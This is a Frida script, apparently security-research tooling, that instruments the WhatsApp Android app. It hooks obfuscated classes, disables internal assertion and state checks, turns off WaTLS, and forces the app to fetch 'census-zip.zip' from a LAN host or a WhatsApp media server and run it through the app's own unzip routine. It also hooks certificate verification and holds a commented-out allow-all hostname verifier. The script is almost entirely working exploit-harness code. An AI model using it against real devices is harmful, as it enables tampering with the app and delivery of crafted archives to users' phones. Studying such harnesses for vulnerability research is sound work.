Java.perform(function() {
    var WATLS_TRUST_MANAGER = "X.35n";

    var WatlsTrustManager = Java.use(WATLS_TRUST_MANAGER);
    var HttpsURLConnection = Java.use("javax.net.ssl.HttpsURLConnection");
    var AllowAllHostnameVerifier = Java.use("org.apache.http.conn.ssl.AllowAllHostnameVerifier");

    WatlsTrustManager.checkServerTrusted.implementation = function(certs, auth_type) {
        console.log("Verifying certificate chain :-( this shouldn't have happened!");
        this.checkServerTrusted(certs, auth_type);
    }

    // HttpsURLConnection.setDefaultHostnameVerifier(AllowAllHostnameVerifier.$new());
});


function download_and_unzip(hostname, name) {
    Java.perform(function() {
        var FILTER_MANAGER = "X.2qo";
        var MEDIA_DOWNLOAD_CONNECTION = "X.0DT";
        var MEDIA_DOWNLOAD_RESPONSE = "X.2jP";
        var ASSERT_UTIL = "X.00E";

        var FilterManager = Java.use(FILTER_MANAGER);
        var MediaDownloadConnection = Java.use(MEDIA_DOWNLOAD_CONNECTION);
        var MediaDownloadResponse = Java.use(MEDIA_DOWNLOAD_RESPONSE);
        var AssertUtil = Java.use(ASSERT_UTIL);

        var filterManager = FilterManager.A00(); // getInstance()
        var mediaDownloadConnection = MediaDownloadConnection.A00(); // getInstance()

        // Bypass certain checks in the WhatsApp code.
        AssertUtil.A00.implementation = function() {}
        AssertUtil.A06.implementation = function(x) {}
        AssertUtil.A07.implementation = function(x) {}

        // Also bypasses state checks in `FilterManager' code.
        var implementation = FilterManager.A0G.implementation;
        FilterManager.A0G.implementation = function() {
            FilterManager.A0G.implementation = implementation;
            return 3;
        }


        ////////// REMOVE THIS TO USE TLS v1.3 //////////

        // isWatlsDNSEnabled()
        MediaDownloadConnection.A05.implementation = function() {
            console.log("Disabled WaTLS DNS");
            return false;
        }

        // isWatlsEnabled()
        MediaDownloadConnection.A06.implementation = function() {
            console.log("Disabled WaTLS");
            return true;
        }

        ////////// REMOVE THIS TO USE TLS v1.3 //////////


        var URL = Java.use("java.net.URL");
        var url = URL.$new("https://" + hostname + "/" + name);

        var mediaDownloadResponse = mediaDownloadConnection.A03(url, hostname, "GET");
        mediaDownloadResponse = Java.cast(mediaDownloadResponse, MediaDownloadResponse);

        console.log("Response code is " + mediaDownloadResponse.A2u()); // getResponseCode()

        filterManager.A0F(mediaDownloadResponse, name, 0); // unzip()

        mediaDownloadResponse.close();
    });
}


function download_and_unzip_lan() {
    download_and_unzip("192.168.1.100", "census-zip.zip");
}

function download_and_unzip_fath() {
    download_and_unzip("media.fath6-1.fna.whatsapp.net", "census-zip.zip");
}

